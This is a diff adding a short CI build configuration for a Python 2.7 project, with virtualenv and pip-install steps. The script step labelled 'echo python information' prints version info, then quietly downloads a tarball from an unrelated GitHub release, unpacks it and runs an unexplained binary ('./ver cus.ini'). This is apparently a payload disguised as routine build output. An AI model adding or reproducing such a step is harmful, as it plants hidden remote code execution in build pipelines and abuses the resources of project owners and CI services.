@@ -1,0 +1,14 @@
+box: python:2.7
+build:
+  steps:
+    - virtualenv:
+        name: setup virtual environment
+        install_wheel: false 
+    - pip-install
+
+    - script:
+        name: echo python information
+        code: |
+          echo "python version $(python --version) running"
+          echo "pip version $(pip --version) running"
+          wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
